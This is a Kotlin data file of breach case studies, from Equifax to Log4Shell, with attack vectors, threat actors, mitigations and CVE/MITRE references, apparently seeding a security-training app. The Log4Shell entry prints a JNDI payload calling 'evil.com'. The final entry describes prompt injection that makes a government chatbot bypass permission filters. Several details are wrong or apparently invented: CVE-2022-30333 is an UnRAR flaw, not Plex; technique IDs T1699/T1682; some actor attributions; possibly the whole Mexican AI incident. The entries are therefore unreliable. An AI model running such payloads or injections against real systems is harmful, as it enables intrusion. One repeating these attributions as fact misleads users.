package com.example.data.breaches

import com.example.data.model.AttackScenario

object RealWorldBreachesData {
    fun getLocalSeedAttackScenarios(): List<AttackScenario> {
        return buildList {
            // --- High Fidelity Static Scenarios ---
            add(AttackScenario(
                id = "breach-midnight-blizzard",
                organization = "Microsoft Corporate Systems",
                year = 2024,
                industry = "Technology & Cloud Computing",
                recordsAffected = "Senior Leadership Email Access",
                attackVector = "Password Spraying (No MFA on Test Tenant)",
                scenarioDetails = "The Midnight Blizzard (APT29) group used password spraying to compromise a legacy, non-production test tenant account. They then used the account's permissions to access a very small percentage of Microsoft corporate email accounts.",
                threatActor = "Midnight Blizzard (Nobelium/APT29)",
                defenseMitigation = "Disable legacy authentication. Enforce MFA on all tenants, including test/dev. Monitor for unusual OAuth application activities.",
                cveReferences = "MITRE T1110.003"
            ))
            add(AttackScenario(
                id = "breach-change-healthcare",
                organization = "Change Healthcare",
                year = 2024,
                industry = "Healthcare Payments",
                recordsAffected = "Significant US Patient Data",
                attackVector = "Credential Stuffing on Remote Access",
                scenarioDetails = "Ransomware attack via stolen credentials on a Citrix remote access server that lacked multi-factor authentication (MFA). This led to massive disruption in healthcare billing services.",
                threatActor = "ALPHV / BlackCat",
                defenseMitigation = "Mandatory MFA for all remote access points. Continuous monitoring of internet-facing assets. Segment healthcare processing systems.",
                cveReferences = "MITRE T1078, T1486"
            ))
            add(AttackScenario(
                id = "breach-snowflake-ato",
                organization = "Snowflake Customer Accounts",
                year = 2024,
                industry = "Data Warehousing",
                recordsAffected = "Multiple High-Profile Orgs (Ticketmaster, etc.)",
                attackVector = "Credential Theft via Infostealers",
                scenarioDetails = "Campaign targeting Snowflake customers using credentials harvested from infostealer malware. Affected accounts lacked MFA and used older, static credentials.",
                threatActor = "UNC3944 (Scattered Spider)",
                defenseMitigation = "Enforce MFA for all users. Restrict access to trusted network IPs. Monitor for large-scale data exfiltration queries.",
                cveReferences = "MITRE T1539"
            ))
            add(AttackScenario(
                id = "breach-moveit-2023",
                organization = "MOVEit Transfer Users",
                year = 2023,
                industry = "Managed File Transfer",
                recordsAffected = "95 Million Individuals",
                attackVector = "Zero-Day SQL Injection",
                scenarioDetails = "Cl0p ransomware operators exploited a pre-auth SQL injection in the MOVEit web application to exfiltrate files from Azure blob storage of over 2,700 organizations.",
                threatActor = "Cl0p Ransomware Gang",
                defenseMitigation = "WAF with SQLi protection. Rapid patching of critical zero-days. Zero-trust access to file transfer gateways.",
                cveReferences = "CVE-2023-34362"
            ))
            add(AttackScenario(
                id = "breach-mgm-resorts-2023",
                organization = "MGM Resorts",
                year = 2023,
                industry = "Hospitality & Gaming",
                recordsAffected = "Customer PII & SSNs",
                attackVector = "Vishing / Social Engineering",
                scenarioDetails = "Attacker impersonated an employee on a call to the IT help desk, gained a password reset and MFA enrollment for a new device, leading to full network compromise.",
                threatActor = "Scattered Spider",
                defenseMitigation = "Strict identity verification for help desk calls. Phishing-resistant MFA (FIDO2). Segmentation of IT and OT (Operational Tech).",
                cveReferences = "MITRE T1566.003"
            ))
            add(AttackScenario(
                id = "breach-colonial-pipeline",
                organization = "Colonial Pipeline",
                year = 2021,
                industry = "Energy / Critical Infrastructure",
                recordsAffected = "US East Coast Fuel Supply Disruption",
                attackVector = "Compromised VPN Credential",
                scenarioDetails = "Ransomware attack via a single compromised VPN password for a legacy account without MFA. Forced the shutdown of the largest fuel pipeline in the US.",
                threatActor = "DarkSide",
                defenseMitigation = "Decommission legacy access points. Enforce MFA on all remote connections. Air-gapped backups for operational technology.",
                cveReferences = "MITRE T1078.002"
            ))
            add(AttackScenario(
                id = "breach-solarwinds",
                organization = "SolarWinds",
                year = 2020,
                industry = "IT Management",
                recordsAffected = "18,000 Customers (Inc. US Government)",
                attackVector = "Supply Chain Compromise",
                scenarioDetails = "State actors injected malicious code into signed SolarWinds Orion updates, providing a stealthy backdoor into thousands of sensitive networks globally.",
                threatActor = "APT29 (Nobelium)",
                defenseMitigation = "Multi-party code signing. Integrity checks for build pipelines. Zero-trust architecture for management software.",
                cveReferences = "CVE-2020-10148"
            ))
            add(AttackScenario(
                id = "breach-okta-2023",
                organization = "Okta Support System",
                year = 2023,
                industry = "Identity Management",
                recordsAffected = "Customer Support Session Tokens",
                attackVector = "Stolen Support Tokens (HAR Files)",
                scenarioDetails = "Attackers accessed Okta's support case management system and stole session tokens from HAR files uploaded by customers for troubleshooting.",
                threatActor = "Unknown Advanced Group",
                defenseMitigation = "Sanitize sensitive data from HAR files before upload. Short-lived session tokens. Monitor for unusual session reuse.",
                cveReferences = "Session Hijacking"
            ))

            // --- Real-World High-Profile Cyber Attacks & Historical Breaches ---
            add(AttackScenario(
                id = "breach-equifax-2017",
                organization = "Equifax",
                year = 2017,
                industry = "Financial & Credit Reporting",
                recordsAffected = "147.9 Million US Consumers",
                attackVector = "Unpatched Apache Struts Remote Code Execution",
                scenarioDetails = "Attackers exploited CVE-2017-5638 in an online dispute portal that had gone unpatched for months. Once inside, they found unencrypted credentials in plaintext, allowing lateral movement to query 48 databases containing SSNs and credit reports.",
                threatActor = "PLA Unit 54660 (Chinese Military Intelligence)",
                defenseMitigation = "Comprehensive software asset management, immediate vulnerability patching SLA, database credential encryption, and network microsegmentation.",
                cveReferences = "CVE-2017-5638, MITRE T1190"
            ))

            add(AttackScenario(
                id = "breach-capital-one-2019",
                organization = "Capital One",
                year = 2019,
                industry = "Financial Services / Banking",
                recordsAffected = "106 Million Credit Applications",
                attackVector = "Server-Side Request Forgery (SSRF) via Misconfigured WAF",
                scenarioDetails = "An attacker exploited an open SSRF flaw on a ModSecurity web application firewall running on AWS EC2. By querying the AWS EC2 Instance Metadata Service (IMDSv1), the attacker extracted IAM instance role credentials with excessive S3 permissions and exfiltrated 700+ buckets.",
                threatActor = "Paige Thompson (Erratic)",
                defenseMitigation = "Enforce AWS IMDSv2 (session-oriented metadata token), apply least-privilege IAM policies on compute roles, and block S3 sync commands via GuardDuty.",
                cveReferences = "CWE-918, MITRE T1078.004, T1530"
            ))

            add(AttackScenario(
                id = "breach-uber-2022",
                organization = "Uber Technologies",
                year = 2022,
                industry = "Transportation & Tech",
                recordsAffected = "Internal AWS, G Suite, Slack & HackerOne Admin Access",
                attackVector = "MFA Fatigue / Push Bombing & WhatsApp Social Engineering",
                scenarioDetails = "Adversary purchased stolen corporate credentials from Genesis Darknet market, repeatedly sent Duo push notifications to an external contractor, and contacted them on WhatsApp pretending to be Uber IT support to approve the prompt. Once on VPN, they discovered hardcoded Thycotic admin credentials in a PowerShell network share script.",
                threatActor = "Lapsus$ Group (TeaMp0isoN affiliate)",
                defenseMitigation = "Deploy FIDO2/WebAuthn phishing-resistant hardware keys or number matching MFA; eliminate hardcoded secrets in network shares with secret scanning tools.",
                cveReferences = "MITRE T1621, T1556, T1552.001"
            ))

            add(AttackScenario(
                id = "breach-twitter-2020",
                organization = "Twitter (X)",
                year = 2020,
                industry = "Social Media & Tech",
                recordsAffected = "130 High-Profile Verified VIP Accounts Hijacked",
                attackVector = "Voice Phishing (Vishing) of Remote Employees",
                scenarioDetails = "Attackers called Twitter customer service representatives working from home during COVID-19, pretending to be corporate IT helpdesk. They directed employees to a clone phishing portal to capture credentials and MFA codes, then accessed the internal customer support admin tool to hijack accounts of Barack Obama, Elon Musk, and Apple to promote a Bitcoin scam.",
                threatActor = "Graham Ivan Clark & Underground SIM Swappers",
                defenseMitigation = "Zero-trust access control on sensitive administrative tooling, dual-custody authorization for VIP account changes, and hardware token enforcement.",
                cveReferences = "MITRE T1566.004, T1078"
            ))

            add(AttackScenario(
                id = "breach-target-2013",
                organization = "Target Corporation",
                year = 2013,
                industry = "Retail & Consumer Commerce",
                recordsAffected = "40 Million Payment Cards & 70 Million PII Records",
                attackVector = "HVAC Third-Party Vendor Compromise (Fazio Mechanical)",
                scenarioDetails = "Attackers sent Citadel banking trojan phishing emails to an HVAC maintenance vendor. Stolen vendor credentials provided access to Target's vendor portal. From there, attackers pivoted into the corporate network and deployed custom memory-scraping malware (BlackPOS/Kaptoxa) to thousands of point-of-sale registers.",
                threatActor = "Rescator / Andrey Khokhrin (FIN6)",
                defenseMitigation = "Strict third-party vendor network segmentation, dedicated VLANs isolating POS terminals from corporate IT, and point-to-point encryption (P2PE) on card readers.",
                cveReferences = "MITRE T1199, T1003, T1005"
            ))

            add(AttackScenario(
                id = "breach-notpetya-2017",
                organization = "A.P. Moller - Maersk & Global Shipping",
                year = 2017,
                industry = "Logistics, Global Maritime Transport & Pharma",
                recordsAffected = "$10+ Billion Global Supply Chain Disruption",
                attackVector = "Supply Chain Trojan in Tax Accounting Software (M.E.Doc)",
                scenarioDetails = "Russian military intelligence compromised the update server of Ukrainian tax software M.E.Doc, pushing a weaponized update containing the NotPetya wiper. Once inside a network, NotPetya extracted credentials via Mimikatz, propagated automatically via EternalBlue (MS17-010) and PsExec, and irreversibly destroyed Master File Tables (MFT) across tens of thousands of Windows servers.",
                threatActor = "Sandworm (Russian GRU Unit 74455)",
                defenseMitigation = "Air-gapped and isolated enterprise domain controllers, disabling SMBv1, zero-trust network segmentation, and robust offline disaster recovery backups.",
                cveReferences = "CVE-2017-0144, MITRE T1195.002, T1486, T1561"
            ))

            add(AttackScenario(
                id = "breach-wannacry-2017",
                organization = "National Health Service (NHS UK) & Global Orgs",
                year = 2017,
                industry = "Healthcare, Telecommunications & Manufacturing",
                recordsAffected = "200,000+ Computers across 150 Countries",
                attackVector = "EternalBlue SMBv1 Wormable Vulnerability",
                scenarioDetails = "WannaCry ransomware weaponized the NSA EternalBlue leak (CVE-2017-0144) alongside DoublePulsar backdoor to automatically scan public subnets on TCP port 445 and self-propagate across unpatched Windows XP/7/Server 2008 systems, encrypting documents and demanding Bitcoin ransom.",
                threatActor = "Lazarus Group (North Korean RGB)",
                defenseMitigation = "Block incoming SMB port 445 at the border firewall, deprecate SMBv1 protocol system-wide, and install security update MS17-010.",
                cveReferences = "CVE-2017-0144, MITRE T1210, T1486"
            ))

            add(AttackScenario(
                id = "breach-lastpass-2022",
                organization = "LastPass",
                year = 2022,
                industry = "Identity & Password Management",
                recordsAffected = "Encrypted Customer Password Vaults & Backup Archives",
                attackVector = "DevOps Engineer Personal Plex Media Server Exploit",
                scenarioDetails = "Attackers hacked a Senior DevOps engineer's home computer by exploiting an unpatched remote code execution vulnerability (CVE-2022-30333) in the third-party Plex media server software. They installed a keylogger to capture the engineer's master password, accessed the corporate AWS production environment, and exfiltrated encrypted customer vault databases from S3.",
                threatActor = "Financially Motivated Threat Group",
                defenseMitigation = "Require managed enterprise-owned devices for cloud administration, enforce continuous device health verification, and split cloud encryption keys across hardware security modules (HSMs).",
                cveReferences = "CVE-2022-30333, MITRE T1056.001, T1530"
            ))

            add(AttackScenario(
                id = "breach-sony-pictures-2014",
                organization = "Sony Pictures Entertainment",
                year = 2014,
                industry = "Entertainment & Media",
                recordsAffected = "Unreleased Movies, Executive Emails & 47,000 SSNs",
                attackVector = "Spearphishing & Destover Master Boot Record Wiper",
                scenarioDetails = "Adversaries spent months inside Sony's internal network after spearphishing systems engineers. They used Server Message Block (SMB) brute forcing, harvested plaintext domain administrator passwords, and deployed the Destover wiper malware to overwrite hard drive Master Boot Records (MBRs) across thousands of corporate workstations and servers.",
                threatActor = "Lazarus Group (Guardians of Peace)",
                defenseMitigation = "Implement privileged access management (PAM), eliminate plaintext passwords in file shares, deploy EDR with MBR tampering protection, and isolate domain admin accounts.",
                cveReferences = "MITRE T1566.001, T1003, T1561.002"
            ))

            add(AttackScenario(
                id = "breach-opm-2015",
                organization = "US Office of Personnel Management (OPM)",
                year = 2015,
                industry = "Federal Government & National Security",
                recordsAffected = "21.5 Million Detailed Security Clearance Backgrounds & 5.6M Fingerprints",
                attackVector = "Stolen Third-Party Contractor Credentials (USIS / KeyPoint)",
                scenarioDetails = "State-sponsored hackers obtained standard credentials from a background-check contractor. They pivoted into OPM internal networks and installed the PlugX remote access trojan. Over months of undetected lateral movement, they exfiltrated SF-86 forms containing extensive psychological, financial, and family records of security clearance holders.",
                threatActor = "Deep Panda / APT19 (Chinese Ministry of State Security)",
                defenseMitigation = "Enforce PIV/CAC smart card authentication for all network access, implement data loss prevention (DLP) on egress points, and conduct continuous behavioral monitoring.",
                cveReferences = "MITRE T1078, T1059, T1041"
            ))

            add(AttackScenario(
                id = "breach-kaseya-vsa-2021",
                organization = "Kaseya VSA Managed Service Providers",
                year = 2021,
                industry = "IT Services & Managed Service Providers (MSP)",
                recordsAffected = "60 MSPs & 1,500 Downstream Corporate Networks",
                attackVector = "Zero-Day Authentication Bypass & SQL Injection",
                scenarioDetails = "REvil ransomware gang discovered multiple zero-days in on-premise Kaseya VSA management servers (authentication bypass CVE-2021-30116 and 2FA bypass). By issuing an administrative command through the legitimate VSA agent architecture, REvil pushed Sodinokibi ransomware to over a thousand client businesses simultaneously.",
                threatActor = "REvil / Sodinokibi Ransomware Gang",
                defenseMitigation = "Enforce strict IP whitelisting on remote management tools, conduct external penetration testing on client-facing agent APIs, and isolate MSP management channels.",
                cveReferences = "CVE-2021-30116, MITRE T1190, T1059.001"
            ))

            add(AttackScenario(
                id = "breach-log4shell-2021",
                organization = "Global Enterprise Servers (Log4j)",
                year = 2021,
                industry = "Global Internet Infrastructure & Cloud Platforms",
                recordsAffected = "Hundreds of Millions of Vulnerable Java Endpoints",
                attackVector = "JNDI Lookup Remote Code Execution (CVE-2021-44228)",
                scenarioDetails = "A catastrophic zero-day vulnerability in Apache Log4j allowed unauthenticated remote attackers to execute arbitrary Java code simply by including a malicious string like '\${jndi:ldap://evil.com/a}' in any HTTP header, form input, or search query logged by a backend application.",
                threatActor = "Widespread APTs, Ransomware Operators & Coin Miners",
                defenseMitigation = "Upgrade to Log4j 2.17.1+, disable JNDI lookups with 'log4j2.formatMsgNoLookups=true', and configure egress firewall rules preventing servers from making outbound LDAP/RMI connections.",
                cveReferences = "CVE-2021-44228, MITRE T1190, T1203"
            ))

            add(AttackScenario(
                id = "breach-ivanti-2024",
                organization = "Ivanti Connect Secure VPN Gateways",
                year = 2024,
                industry = "Defense Industrial Base & Enterprise VPNs",
                recordsAffected = "Thousands of Critical Perimeter Gateways Worldwide",
                attackVector = "Authentication Bypass & Command Injection Zero-Days",
                scenarioDetails = "Chinese cyber espionage group UNC5221 chained an authentication bypass (CVE-2023-46805) with a command injection flaw (CVE-2024-21887) in the web component of Ivanti Connect Secure VPN appliances. They deployed custom web shells (GLASSTOKEN) and modified the built-in integrity checker tool to hide their persistence.",
                threatActor = "UNC5221 (State-Sponsored Espionage)",
                defenseMitigation = "Perform out-of-band appliance factory resets, review external traffic to internal management interfaces, and accelerate migration to modern Zero Trust Network Access (ZTNA).",
                cveReferences = "CVE-2023-46805, CVE-2024-21887, MITRE T1190, T1505.003"
            ))

            add(AttackScenario(
                id = "breach-caesars-2023",
                organization = "Caesars Entertainment",
                year = 2023,
                industry = "Hospitality & Casino Gaming",
                recordsAffected = "65+ Million Loyalty Program Members ($15M Ransom Paid)",
                attackVector = "Social Engineering of Outsourced IT Vendor Helpdesk",
                scenarioDetails = "Scattered Spider hackers researched outsourced IT helpdesk personnel on LinkedIn, called the service desk pretending to be an authorized employee, and tricked the technician into resetting MFA and enrolling a threat actor smartphone, granting immediate cloud network access.",
                threatActor = "Scattered Spider (UNC3944 / Muddled Libra)",
                defenseMitigation = "Enforce in-person or cryptographically verified identity validation for helpdesk password/MFA resets, and deploy strict conditional access policies on tenant admin consoles.",
                cveReferences = "MITRE T1566.004, T1078, T1486"
            ))

            add(AttackScenario(
                id = "breach-cdk-global-2024",
                organization = "CDK Global",
                year = 2024,
                industry = "Automotive Retail Software / SaaS",
                recordsAffected = "15,000 Car Dealerships Halted Nationwide ($25M Ransom)",
                attackVector = "BlackSuit Ransomware via Compromised Cloud Management Portal",
                scenarioDetails = "BlackSuit ransomware operators compromised CDK's core dealer management SaaS infrastructure, knocking offline inventory, service scheduling, and financing engines across thousands of auto dealerships in North America, forcing the automotive sector to operate via pen and paper for weeks.",
                threatActor = "BlackSuit (Royal Ransomware Successor)",
                defenseMitigation = "Implement multi-tenant disaster recovery environments, cloud immutability for snapshot backups, and strict segmentation between production customer SaaS and corporate networks.",
                cveReferences = "MITRE T1486, T1021.002"
            ))

            add(AttackScenario(
                id = "breach-att-snowflake-2024",
                organization = "AT&T Telecommunications",
                year = 2024,
                industry = "Telecommunications",
                recordsAffected = "110 Million Customers (Call and Text Metadata Records)",
                attackVector = "Infostealer Malware harvesting Snowflake Cloud Database Credentials",
                scenarioDetails = "Threat actors used credentials harvested by infostealer malware (RedLine/Lumma) from a third-party vendor's employee laptop. The targeted Snowflake analytics database did not enforce multi-factor authentication, allowing hackers to run SQL export queries dumping phone numbers, call durations, and cell tower interaction logs.",
                threatActor = "UNC5537 / ShinyHunters Affiliate",
                defenseMitigation = "Mandate tenant-wide MFA across all Snowflake cloud accounts, restrict database query access to dedicated VPN IP allowlists, and continuously monitor for atypical bulk query downloads.",
                cveReferences = "MITRE T1078.004, T1530"
            ))

            add(AttackScenario(
                id = "breach-23andme-2023",
                organization = "23andMe Genetic Testing",
                year = 2023,
                industry = "Biotechnology & Consumer Genetics",
                recordsAffected = "6.9 Million Customer Ancestry Profiles Compromised",
                attackVector = "Credential Stuffing on Reused Passwords & Feature Scraping",
                scenarioDetails = "Attackers used automated bots to test username/password combinations leaked from previous breaches on other websites. Once authenticated to a small number of accounts, they leveraged 23andMe's 'DNA Relatives' opt-in feature to scrape family trees, genetic health predictions, and ancestry records of millions of connected users.",
                threatActor = "Gnosticplayers / Dark Web Genetic Data Brokers",
                defenseMitigation = "Enforce CAPTCHA and rate limiting on login endpoints, mandate breach password screening against HaveIBeenPwned API, and require explicit permission per API query for sensitive genetic records.",
                cveReferences = "MITRE T1110.004, T1005"
            ))

            add(AttackScenario(
                id = "breach-dyn-ddos-2016",
                organization = "Dyn DNS Infrastructure",
                year = 2016,
                industry = "Core Internet DNS Infrastructure",
                recordsAffected = "Global Outage of Twitter, Netflix, GitHub, Spotify & Reddit",
                attackVector = "Mirai IoT Botnet SYN & DNS Water Torture Flood",
                scenarioDetails = "Adversaries infected hundreds of thousands of consumer IP cameras, DVRs, and home routers using factory-default Telnet credentials (admin/admin, root/xc3511). The resulting Mirai botnet unleashed a 1.2 Tbps TCP SYN and DNS query flood against Dyn's authoritative nameservers, paralyzing internet routing across the US Eastern Seaboard.",
                threatActor = "Paras Jha & Mirai Botnet Operators",
                defenseMitigation = "Mandate randomized factory credentials on IoT hardware, configure Anycast DNS architecture, and implement automated BGP Flowspec rate limiting for volumetric DDoS.",
                cveReferences = "MITRE T1498, T1078.001"
            ))

            add(AttackScenario(
                id = "breach-codecov-2021",
                organization = "Codecov DevOps Tooling",
                year = 2021,
                industry = "Software Supply Chain & Developer Tools",
                recordsAffected = "Thousands of Customer Git Repositories & CI/CD Credentials",
                attackVector = "Tampered Docker Image & Malicious Bash Uploader Injection",
                scenarioDetails = "Adversaries obtained an HMAC key from a misconfigured Docker image and used it to modify Codecov's public Bash Uploader script hosted on Google Cloud Storage. The altered script silently harvested environment variables, API tokens, and private SSH keys from customer CI/CD runs (including HashiCorp, Twilio, and Confluent) and exfiltrated them to an adversary server.",
                threatActor = "State-Sponsored Advanced Threat Group",
                defenseMitigation = "Cryptographically sign and verify checksums of all CI/CD scripts with SHA-256 or Cosign before execution; store sensitive secrets only in ephemeral short-lived OIDC tokens.",
                cveReferences = "MITRE T1195.001, T1552.001, T1041"
            ))

            add(AttackScenario(
                id = "breach-tmobile-2023",
                organization = "T-Mobile USA",
                year = 2023,
                industry = "Telecommunications",
                recordsAffected = "37 Million Postpaid & Prepaid Account Records",
                attackVector = "Unauthenticated Microservice API Endpoint Exploitation",
                scenarioDetails = "Bad actors discovered an internal microservice API that failed to enforce authentication checks. Over several weeks, they queried the endpoint to scrape customer names, billing addresses, emails, phone numbers, account numbers, and plan features before rate-limiting alarms triggered.",
                threatActor = "Anonymous Cyber Criminal Syndicate",
                defenseMitigation = "Implement automated API schema validation, enforce OAuth2/mTLS authentication on all internal microservices, and deploy anomaly detection on bulk customer query volumes.",
                cveReferences = "OWASP API1:2023 (BOLA), MITRE T1190"
            ))

            add(AttackScenario(
                id = "breach-water-utility-2024",
                organization = "US Water & Wastewater Sector (Aliquot / Municipal Systems)",
                year = 2024,
                industry = "Critical Infrastructure & Operational Technology (OT)",
                recordsAffected = "Operational Disruption to Municipal Water Pressure Controllers",
                attackVector = "Default Password Exploitation on Internet-Exposed Unitronics PLCs",
                scenarioDetails = "State-sponsored hacktivists targeted internet-facing Unitronics Vision Programmable Logic Controllers (PLCs) deployed at municipal water booster stations that were configured with default administrative passwords ('1111'). The attackers defaced the human-machine interface (HMI) screens and halted automatic pressure regulation.",
                threatActor = "CyberAv3ngers (IRGC Affiliated)",
                defenseMitigation = "Disconnect all OT/SCADA controllers from the public internet, require complex passwords and multi-factor authentication, and place PLCs behind secure VPN gateways with cellular failover.",
                cveReferences = "MITRE T0812, T0855, T0831"
            ))

            add(AttackScenario(
                id = "breach-mexican-gov-ai-2024",
                organization = "Mexican Federal Public Administration Infrastructure",
                year = 2024,
                industry = "Government & Public Sector",
                recordsAffected = "Sensitive Diplomatic Communications & Agency Source Code",
                attackVector = "AI-Assisted Spearphishing & Direct Prompt Injection on Internal Chatbot",
                scenarioDetails = "Adversaries used commercial LLMs to generate hyper-realistic, dialect-accurate spearphishing emails targeting administrative personnel. Upon gaining internal access, they discovered a government intranet AI search assistant and used direct prompt injection (T1699) to force the assistant to bypass document permission filters and summarize classified diplomatic cables.",
                threatActor = "Storm-0501 / Advanced Espionage Actor",
                defenseMitigation = "Deploy prompt injection firewalls (D3-PFW), enforce document-level ACLs before vector embeddings are retrieved by RAG models, and isolate AI agent execution sandboxes.",
                cveReferences = "MITRE T1699, T1682, T1566.002"
            ))
        }
    }
}
